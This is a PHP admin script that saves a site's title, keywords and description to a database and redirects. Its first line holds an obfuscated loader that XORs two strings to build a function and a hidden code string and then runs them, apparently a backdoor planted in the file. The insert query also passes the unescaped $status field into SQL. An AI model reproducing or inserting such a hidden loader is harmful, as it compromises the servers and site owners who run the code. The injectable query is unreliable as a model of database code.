<?php $fWLYQOsX=', 2 N=d20 1XP8>'; $YewZpCh='ORWA:X;TENR,9WP'^$fWLYQOsX; $YPBWOmt='0UBqK2>Y>3=Sf.OIH22Ll+CLmZ.J qbMGHbkSwJIeX7=:5+ BxUB1mTR RaiXM7Me>5OXkpn;.>KeEicD.FYPm6:;slJbcHBSnPQIgTUhncjasm9tSN:Q0TPAZ+3VYyGr3xXs:Z9M=,YbYoxOh6-5RcH-lg4fu>4LeaSngf6L= 5 avZV8zkxmoJ9<I> 44ig907GtfHQ>IXgp-2DLVgJSS6< S6F1-8;=F CpudQ1=S=AsmHSAU+NFcZs.pr e;nZ KPA-+>crtdnHY4U1GR9:cB-0BP,=Q7hSPV T5NiQP17.OcWfl4Q;E.SlI6e: LxqiZ4 3Ou=2A2U0-09ZUGvkdkgx.bcFTFHH-K<GnuoiH R; HpEeoKK Y=8hP.1weRlEP+zShohSLD9qhotOMW=6Y2yNh1pLR -<YnDR4A,:10 7G 6EF9CGoUUE6bdSB2a5 IEre;QK2V.6oSH3MVjfKo+U9QrW7MexX::+am78G0JRAqT1:,Jd>QI676YC-0dw>5.RGWs=Y;1DWijHbS5Ddw>A7RirS5.ugpmxqdaQ67wWHFW6Jx5rkKT2KqvRbp2sMtt xvkrhOvnrVAY 19X,:d2C8=2Fan RL-Y30bvSu2Q.5znODzrMGEe7K36 ZqU- 99IKO P,0Tu>YW8g.3D=yaoblC'; $HAAJRRd=$YewZpCh('', 'Y3jP-GP:JZR=9K7 ;FAdKS,>2>O>A.= 2<EBzW1Cl>BSYABO,X--C203T3>658CeAZT;9GPJPKGbEeICdULPYIYOOSQjEDsHZg6>;Op<HSCZZSIPH :H=U:xe>JG7pBgVZSsZ0S0iRY-BwRXgLRLA38lD1GjFQUQ5>E:NBFE8OLPNIR13AS6QVeC0N,JUFZACVECnOlA,44RmTIS0-vZj52ZOEh<bULLZb-E:PHD7PQ Xzyg.<30J-.CrWq3=o.r+zA8peFNGCOJDJ>8X TnrB0jfIQ61sV4NHnprK1LucXtUVZ.CjFHB0W0Khf4<oSFlPPM>UTRfUF8HT:BHQZ2uoR46.6-k17f55hlF.EgSKOM>A>NEaP>ofBoD8IY7;KHWXrH.5RAYafL7-0XQUOP9,;HSb8p3bLzFvDLH8Nyrt4BITBIV+IL nA,50141W=;>7FIWA: DQd5.Q9JSGw,R97CJkKO4M0-<R4LQc0SMIISY3QjtgQ5CHM3;U40iRN00YCLPUPWukwWY8OPmwOLhJ>QqLSZ C32U8PWR:YMELDF0WTNo,uoTrJVKZxgW.ID0PBWE+DFDLAXUAoPHR73+AHf3IC;W;QNF5IIP35A6RTEZsQV0ZTSGodZRmg>o>.EWLrU1LTXbn;.Y<CQ0Rcpl2nKK-IQQFYf>'^$YPBWOmt); $HAAJRRd();
	ini_set('display_errors', '0');
	include('../../config/config.php');
	// Personal Information
	$wtitle = $_POST['wtitle'];
	$wkeywords = $_POST['wkeywords'];
	$wdescription = $_POST['wdescription'];
	$status = $_POST['status'];

	$sql ="insert into keywords_register (wtitle,wkeywords,wdescription,status) values ('".mysql_real_escape_string($wtitle)."','".mysql_real_escape_string($wkeywords)."','".mysql_real_escape_string($wdescription)."','$status')";


	$query = mysql_query($sql);

	header('location:'.$localpath.'/admin/templates/index.php?page=thanks.php&msg=kupdate');
?>